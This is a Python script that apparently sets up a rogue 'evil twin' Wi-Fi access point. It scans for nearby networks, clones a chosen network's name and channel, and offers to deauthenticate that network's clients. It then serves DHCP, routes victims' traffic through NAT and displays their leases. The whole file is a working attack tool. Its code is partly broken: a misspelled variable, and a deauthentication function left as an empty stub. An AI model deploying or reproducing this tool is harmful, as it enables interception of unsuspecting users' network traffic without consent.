#!/usr/bin/env python

import os
from subprocess import Popen, PIPE
import time
import sys
import re
import signal
import argparse
from scapy.all import *
from multiprocessing import Process
from threading import Thread, Lock

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

DN = open(os.devnull, 'w')
APs = {}
chan = 0 # global for channel hopping Process
count = 0
forw = '0\n'

def parse_args():
    #Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--channel", help="Choose the channel for the fake AP. Default is channel 6.")
    parser.add_argument("-e", "--essid", help="Choose the ESSID for the fake AP. Default is 'Free Wifi'. Wrap in quotes if it is more than 1 word: -e 'Free Wifi'")
    parser.add_argument("-t", "--targeting", help="Will print a list of APs in range", action="store_true")
    return parser.parse_args()


###############
# AP TARGETING
###############

def target_APs():
    os.system('clear')
    print '['+T+'*'+W+'] If channel hopping is not working disconnect the monitor mode parent interface (like wlan1) from the network it is on'
    print 'num  ch   ESSID'
    print '---------------'
    for ap in APs:
        print G+str(ap).ljust(2)+W+' - '+APs[ap][0].ljust(2)+' - '+T+APs[ap][1]+W

def cb(pkt):
    global APs, count
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        ap_channel = str(ord(pkt[Dot11Elt:3].info))
        essid = pkt[Dot11Elt].info
        mac = pkt[Dot11].addr2
        if len(APs) > 0:
            for num in APs:
                if essid in APs[num][1]:
                    return
        count += 1
        APs[count] = [ap_channel, essid, mac]
        target_APs()

def channel_hop(mon_mode):
    global chan
    while 1:
        try:
            if chan > 11:
                chan = 0
            chan = chan+1
            channel = str(chan)
            Popen(['iw', 'dev', mon_mode, 'set', 'channel', channel], stdout=DN, stderr=DN)
            time.sleep(2)
        except KeyboardInterrupt:
            sys.exit()

def sniffing(mon_mode):
    sniff(iface=mon_mode, prn=cb, store=0)

def copy_AP():
    copy = None
    while not copy:
        try:
            copy = raw_input('\n['+G+'+'+W+'] Choose the ['+G+'num'+W+'] of the AP you wish to copy: ')
            copy = int(copy)
        except Exception:
            copy = None
            continue
    channel = APs[copy][0]
    essid = APs[copy][1]
    mac = APs[copy][2]
# Make a funciton here? ############################################3
    yn = raw_input('['+G+'+'+W+'] Deauthenticate clients on '+T+essid+W+' at '+T+mac+W+'? [y/n]: ')
    if yn == 'y':
        target_deauth()
    return channel, essid, mac

def target_deauth():
    pass


##################
# END AP TARGETING
##################


def iwconfig():
    monitors = []
    interfaces = {}
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue # Isn't an empty string
        if line[0] != ' ': # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search: # Isn't wired
                iface = line[:line.find(' ')] # is the interface
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    if len(interfaces) < 2:
        sys.exit('[-] You need at least 2 wireless interfaces. Please bring 2 up and retry.')
    return monitors, interfaces

def rm_mon(monitors):
    for m in monitors:
        if 'mon' in m:
            Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
        else:
            Popen(['iw', 'dev', m, 'mode', 'managed'], stdout=DN, stderr=DN)

def internet_info(interfaces):
    proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
    def_route = proc.communicate()[0].split('\n')[0].split()
    inet_iface = def_route[4]
    ipprefix = def_route[2][:2] # Just checking if it's 19, 17, or 10
    return inet_iface, ipprefix

def AP_iface(interfaces, inet_iface):
    for i in interfaces:
        if i != inet_iface:
            return i

def iptables(inet_iface):
    global forw
    print '['+T+'*'+W+'] Setting up iptables'
    os.system('iptables -X')
    os.system('iptables -F')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('iptables -t nat -A POSTROUTING -o %s -j MASQUERADE' % inet_iface)
    with open('/proc/sys/net/ipv4/ip_forward', 'r+') as ipf:
        forw = ipf.read()
        ipf.write('1\n')
        print '['+T+'*'+W+'] Enabled IP forwarding'
        return forw

def start_monitor(ap_iface, args):
    print '['+T+'*'+W+'] Setting up monitor mode'
    channel = '6'
    if args.channel:
        channel = args.channel
    proc = Popen(['airmon-ng', 'start', ap_iface, channel], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if "monitor mode enabled" in line:
            line = line.split()
            mon_mode = line[4][:-1]
            return mon_mode

def start_ap(mon_mode, args, channel, essid):
    if args.channel:
        channel = args.channel
    if args.essid:
        essid = args.essid
    Popen(['airbase-ng', '-c', channel, '-e', essid, '-v', mon_mode], stdout=DN, stderr=DN)
    try:
        time.sleep(6) # Copied from Pwnstar which said it was necessary?
    except KeyboardInterrupt:
        cleanup(None, None)
    Popen(['ifconfig', 'at0', 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
    Popen(['ifconfig', 'at0', 'mtu', '1400'], stdout=DN, stderr=DN)

def dhcp_conf(ipprefix):
    config = ('default-lease-time 300;\n'
              'max-lease-time 360;\n'
              'ddns-update-style none;\n'
              'authoritative;\n'
              'log-facility local7;\n'
              'subnet %s netmask 255.255.255.0 {\n'
              'range %s;\n'
              'option routers %s;\n'
              'option domain-name-servers %s;\n'
              '}')
    if ipprefix == '19' or ipprefix == '17':
        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
            # subnet, range, router, dns
            dhcpconf.write(config % ('10.0.0.0', '10.0.0.2 10.0.0.100', '10.0.0.1', '8.8.8.8'))
    elif iprefix == '10':
        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
            dhcpconf.write(config % ('172.16.0.0', '172.16.0.2 172.16.0.100', '172.16.0.1', '8.8.8.8'))
    return '/tmp/dhcpd.conf'

def dhcp(dhcpconf, ipprefix):
    print '['+T+'*'+W+'] Clearing leases and starting DHCP'
    os.system('echo > /var/lib/dhcp/dhcpd.leases')
    dhcp = Popen(['dhcpd', '-cf', dhcpconf], stdout=PIPE, stderr=DN)
    if ipprefix == '19' or ipprefix == '17':
        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
    else:
        os.system('route add -net 172.16.0.0 netmask 255.255.255.0 gw 172.16.0.1')

def cleanup(signal, frame):
    global forw
    print '\n['+R+'!'+W+'] Clearing iptables and turning off IP forwarding...'
    with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
        forward.write(forw)
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('pkill airbase-ng')
    os.system('pkill dhcpd') # Dangerous?
    sys.exit(0)

def main(args):
    global ipf, mon_mode
    channel = '1'
    essid = 'Free Wifi'

    monitors, interfaces = iwconfig()
    rm_mon(monitors)
    inet_iface, ipprefix = internet_info(interfaces)
    ap_iface = AP_iface(interfaces, inet_iface)
    ipf = iptables(inet_iface)
    mon_mode = start_monitor(ap_iface, args)
    if args.targeting:
        hop = Process(target=channel_hop, args=(mon_mode,))
        hop.start()
        sniffing(mon_mode)
        hop.terminate()
        channel, essid, mac = copy_AP()
    start_ap(mon_mode, args, channel, essid)
    dhcpconf = dhcp_conf(ipprefix)
    dhcp(dhcpconf, ipprefix)
    signal.signal(signal.SIGINT, cleanup)
    while 1:
        os.system('clear')
        print '['+T+'*'+W+'] Finished setting up '+T+essid+W+' on channel '+T+channel+W
        print '    DHCP leases updated every 5 seconds:\n'
        proc = Popen(['cat', '/var/lib/dhcp/dhcpd.leases'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            print line
        time.sleep(5)

main(parse_args())
